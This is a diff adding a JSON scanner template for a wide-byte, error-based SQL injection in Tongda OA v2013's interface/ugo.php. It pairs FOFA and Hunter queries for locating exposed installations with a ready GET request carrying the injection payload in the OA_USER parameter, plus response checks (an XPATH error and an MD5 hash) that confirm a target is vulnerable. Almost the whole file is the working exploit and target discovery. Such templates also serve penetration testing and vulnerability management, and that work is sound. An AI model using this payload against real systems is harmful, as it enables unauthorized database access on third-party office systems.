@@ -1,0 +1,36 @@
+{
+  "product": "通达OA",
+  "vul_name": "通达OA v2013 interface/ugo.php宽字节报错注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "通达OA v2013 interface/ugo.php宽字节报错注入",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"TDXK-通达OA\"",
+    "Hunter": "app.name=\"通达 OA\""
+  },
+  "protocol": "http",
+  "link": "https://xz.aliyun.com/t/10726?time__1311=mq%2BxB7DQGQD%3D0QDkDlpIe0%3DmH45xceZlOloD&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/interface/ugo.php?OA_USER=1%df'and extractvalue(1,concat(0x5c,MD5(123456))) -- -"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "body": "XPATH syntax error"
+        },
+        {
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
